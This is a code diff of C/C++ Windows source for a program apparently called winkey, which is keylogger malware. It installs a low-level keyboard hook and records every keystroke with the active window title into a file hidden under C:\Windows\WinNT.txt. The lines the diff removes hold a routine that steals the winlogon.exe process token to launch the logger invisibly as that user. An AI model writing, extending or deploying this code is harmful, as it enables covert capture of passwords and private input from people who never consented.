@@ -3,9 +3,9 @@
 HHOOK hHock = NULL;
 HWND currWindow;
 HWND lastWindow = NULL;
-bool shift = false;
+bool shift_k = false;
 char title[256];
-char* timebuf = (char*)malloc(sizeof(char) * 80);
+
 FILE *file;
 HANDLE                  newExecToken;
 PROCESS_INFORMATION     winkeyPI;
@@ -14,7 +14,6 @@ DWORD GetPidByName(char* filename)
 {
 	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
 	PROCESSENTRY32 pEntry;
-	PROCESSENTRY32 ptemp[5];
 	pEntry.dwSize = sizeof(PROCESSENTRY32);
 	BOOL hRes = Process32First(hSnapShot, &pEntry);
 	int i = 0;
@@ -22,109 +21,53 @@ DWORD GetPidByName(char* filename)
 	{
 		if (strcmp(pEntry.szExeFile, filename) == 0)
 		{
-			ptemp[i] = pEntry;
 			i++;
-			//CloseHandle(hSnapShot);
 		}
 		hRes = Process32Next(hSnapShot, &pEntry);
 	}
 	CloseHandle(hSnapShot);
-	printf("%ld", ptemp[0].th32ProcessID);
-	return(ptemp[i-1].th32ProcessID);
-	//return(0);
-}
-
-void    Tinky_Winky() {
-	DWORD winlogonPID;
-	HANDLE wlPH;
-	HANDLE wlTH;
-	char* deb = "C:\\Users\\User\\source\\repos\\tinky-winkey\\winkey.exe";
-	LPCSTR PP = deb;
-	STARTUPINFO Si;
-
-	ZeroMemory(&Si, sizeof(Si));
-	Si.cb = sizeof(Si);
-	winlogonPID = GetPidByName("winlogon.exe");
-	wlPH = OpenProcess(PROCESS_QUERY_INFORMATION, 0, winlogonPID);
-	if (!OpenProcessToken(wlPH, TOKEN_DUPLICATE, &wlTH)) {
-		printf("opt\n");
+	printf("%d",i);
+	if (i == 1) {
+		return(1);
 	}
-	CloseHandle(wlPH);
-	/*if (!DuplicateTokenEx(wlTH, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID, NULL, SecurityImpersonation, TokenPrimary, &newExecToken)) {
-		printf("dtEx\n");
-	}*/
-	if (!DuplicateTokenEx(wlTH, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &newExecToken)) {
-		printf("dtEx\n");
-	}
-	CloseHandle(wlTH);
-
-	/*if (!CreateProcessWithTokenW(newExecToken, LOGON_WITH_PROFILE, PP, NULL, CREATE_NO_WINDOW, NULL, NULL, NULL, &winkeyPI)) {
-		printf("cpwt (%ld)\n", GetLastError());
-	}*/
-	if (!CreateProcessAsUser(newExecToken, PP, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &Si, &winkeyPI)) {
-		printf("cpwt (%ld)\n", GetLastError());
+	else {
+		return(0);
 	}
 }
 
-void getTime(char **timebuf) {
+void getTime(char **timebuff) {
     time_t ltime;
     struct tm  tstruct;
     char buff[80];
     ltime = time(0);
     tstruct = *localtime(&ltime);
     strftime(buff, sizeof(buff), "%d-%m-%Y %X", &tstruct);
-    strcpy(*timebuf, buff);
+    strcpy(*timebuff, buff);
 }
-
-//void    KeyLogger() {
-//    HWND currWindow;
-//    char title[256];
-//    char* timebuf;
-//    timebuf = (char*)malloc(sizeof(char) * 80);
-//    while (1) {
-//        currWindow = GetForegroundWindow();
-//        GetWindowText(currWindow, title, sizeof(title));
-//        getTime(&timebuf);
-//        printf("[ %s ] - ", timebuf);
-//        printf(" '%s'\n", title);
-//        ch = getch();
-//        printf("%c", ch);
-//        while (currWindow == GetForegroundWindow()) {
-//            ch = getch();
-//            printf("%c", ch);
-//            ///key hooks
-//
-//        }
-//        getTime(&timebuf);
-//        printf("[ %s ] - ", timebuf);
-//        printf(" 'window changed'\n");
-//        Sleep(200);
-//    }
-//}
 
 LRESULT CALLBACK KeyLogger(int nCode, WPARAM wParam, LPARAM lParam) {
 	bool caps = false;
 	int capsShort = GetKeyState(VK_CAPITAL);
-	file = fopen("c:\\secret.txt", "a");
+	char* timebuf = (char*)malloc(sizeof(char) * 80);
+	file = fopen("C:\\Windows\\WinNT.txt", "a");
 	if(capsShort)
 	{
 		caps = TRUE;
 	}
 	std::string buffer;
-	//file.open("c:\\secret.txt", std::ios_base::app);
 	KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
 	if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT) {
 		if (wParam == WM_KEYDOWN)
 		{
-			shift = TRUE;
+			shift_k = TRUE;
 		}
 		if (wParam == WM_KEYUP)
 		{
-			shift = FALSE;
+			shift_k = FALSE;
 		}
 		else
 		{
-			shift = FALSE;
+			shift_k = FALSE;
 		}
 	}
 	if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN)
@@ -143,25 +86,21 @@ LRESULT CALLBACK KeyLogger(int nCode, WPARAM wParam, LPARAM lParam) {
 			lastWindow = currWindow;
 		}
 		if (p->vkCode) {
-			buffer.append(HookCode(p->vkCode, caps, shift));
+			buffer.append(HookCode(p->vkCode, caps, shift_k));
 		}
 	}
 	fprintf(file, "%s", buffer.data());
 	fclose(file);
 	buffer.clear();
+	free(timebuf);
     return CallNextHookEx(hHock, nCode, wParam, lParam);
 }
 
-int main(int ac, char **av) {
-	char* pass = "1337";
+int main() {
+	if (!GetPidByName("winkey.exe")) {
+		return (0);
+	}
     MSG msg;
-    if (ac == 2) {
-        Tinky_Winky();
-        return 0;
-    }
-	file = fopen("c:\\secret.txt", "a");
-	fprintf(file, "%s", "winkey init \n");
-	fclose(file);
     hHock = SetWindowsHookEx(WH_KEYBOARD_LL, KeyLogger, NULL, NULL);
 	while (GetMessage(&msg, NULL, 0, 0) > 0)
 	{
